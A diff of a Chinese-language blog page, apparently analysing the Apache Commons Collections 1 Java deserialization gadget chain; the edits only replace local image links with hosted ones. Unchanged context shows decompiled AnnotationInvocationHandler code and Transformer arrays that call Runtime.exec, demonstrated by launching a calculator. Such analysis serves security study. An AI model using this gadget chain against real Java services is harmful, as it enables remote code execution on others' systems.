@@ -408,7 +408,7 @@
 <h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>抽象基类，简化创建map修饰器的任务</p>
 <p>我们找到rt.jar包可以通过Java Decompiler获取到关联源文件</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220303190958.png"></p>
-<p>![image-20220303190923290](Java反序列化-Commons Collections1利用链分析.assets/image-20220303190923290.png)</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304222913.png"></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造方法</span><br>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; paramClass, Map&lt;String, Object&gt; paramMap)<br>&#123;<br>	<span class="hljs-keyword">this</span>.type = paramClass; <span class="hljs-comment">//this.type是我们传入的Annotation类型Class</span><br>	<span class="hljs-keyword">this</span>.memberValues = paramMap; <span class="hljs-comment">//memberValues为我们传入的map</span><br>&#125;<br><br><span class="hljs-comment">//readObject</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream paramObjectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="hljs-function"></span>&#123;<br>    paramObjectInputStream.defaultReadObject();<br>    <br>    AnnotationType localAnnotationType = <span class="hljs-keyword">null</span>;<br>    <br>    <span class="hljs-keyword">try</span><br>    &#123;<br>      localAnnotationType = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (IllegalArgumentException localIllegalArgumentException)<br>    &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br>    <br>    Map localMap = localAnnotationType.memberTypes(); <span class="hljs-comment">//获取注解类类型的map</span><br>    <br>    <span class="hljs-comment">//遍历map</span><br>    <span class="hljs-keyword">for</span> (Map.Entry localEntry : <span class="hljs-keyword">this</span>.memberValues.entrySet())<br>    &#123;<br>      <span class="hljs-comment">//获取map的key，也就是我们注解类</span><br>      String str = (String)localEntry.getKey();<br>      <span class="hljs-comment">//查询key的注解类接口的方法</span><br>      Class localClass = (Class)localMap.get(str);<br>      <br>      <span class="hljs-comment">//如果key注解下的方法，不能为空，否则不进入方法</span><br>      <span class="hljs-keyword">if</span> (localClass != <span class="hljs-keyword">null</span>)<br>      &#123;<br>        <span class="hljs-comment">//获取value的对象</span><br>        Object localObject = localEntry.getValue();<br>        <span class="hljs-comment">//判断localClass是否可以与我们传入的bbb字符串进行强转，以及判断是不是ExceptionProxy对象</span><br>        <span class="hljs-keyword">if</span> ((!localClass.isInstance(localObject)) &amp;&amp; (!(localObject <span class="hljs-keyword">instanceof</span> ExceptionProxy))) &#123;<br>          <br>          localEntry.setValue(<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(localObject<br>          <br>            .getClass() + <span class="hljs-string">&quot;[&quot;</span> + localObject + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>            (Method)localAnnotationType.members().get(str)));<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 </br>
@@ -456,7 +456,7 @@
 </br>
 
 <p>AbstractInputCheckedMapDecorator的MapEntry调用了setVlalue方法，MapEntry就是有个键值对</p>
-<p>![image-20220304105245285](Java反序列化-Commons Collections1利用链分析.assets/image-20220304105245285.png)</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223127.png"></p>
 <p>我们可以看到这种类继承的是AbstractMapDecorator，重写了setValue，AbstractMapEntryDecorator最终还是实现Map.Entry</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304104552.png"></p>
 <p>这个就是遍历键值对的写法</p>
@@ -493,7 +493,7 @@
 </br>
 
 <p>通过ChainedTransformer做一个递归的调用</p>
-<p>![image-20220304170923555](Java反序列化-Commons Collections1利用链分析.assets/image-20220304170923555.png)</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223000.png"></p>
 <p>ChainedTransformer通过传入Transformer数组进行递归调用到InvokerTransformer的transform，传入Runtime类，最终我们就可以获取去到exec执行弹出计算器</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure>
 
@@ -515,7 +515,7 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>之后判断localClass是否可以与我们传入的bbb字符串进行强转，以及判断是不是ExceptionProxy对象，返回的为true继续走到下面</p>
-<p>![image-20220304180014079](Java反序列化-Commons Collections1利用链分析.assets/image-20220304180014079.png)</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223020.png"></p>
 <p>最终我们新增了ConstantTransformer传入Runtime.class对象，为什么这样做呢</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure>
 
@@ -530,11 +530,11 @@
 <p>进入ConstantTransformer.transform方法后，这个方法返回一个object也就是我们的Runtime对象</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304213402.png"></p>
 <p>再看下现在的object值，成功被ConstantTransformer返回的对象覆盖，这也就造成为什么我们不需要在setValue传入Runtime对象了</p>
-<p>![image-20220304215147384](Java反序列化-Commons Collections1利用链分析.assets/image-20220304215147384.png)</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223041.png"></p>
 <p>最后是通过invoke执行代码</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304213808.png"></p>
 <p>成功弹计算器</p>
-<p>![image-20220304215329491](Java反序列化-Commons Collections1利用链分析.assets/image-20220304215329491.png)</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223103.png"></p>
 
     </div>
 </div>
